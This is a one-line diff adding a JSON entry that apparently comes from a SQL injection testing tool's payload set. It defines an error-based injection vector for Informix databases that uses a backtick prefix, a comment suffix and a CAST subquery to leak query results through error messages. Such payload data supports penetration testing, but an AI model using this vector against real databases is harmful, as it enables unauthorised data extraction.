@@ -1,0 +1,1 @@
+{"dbms": "informix", "technique": "error", "boundary": {"prefix": "`", "suffix": "-- -", "type": "backtick"}, "vector": "{B} AND 1=(SELECT CAST(({Q}) AS INT))", "comment": "informix error: backtick"}
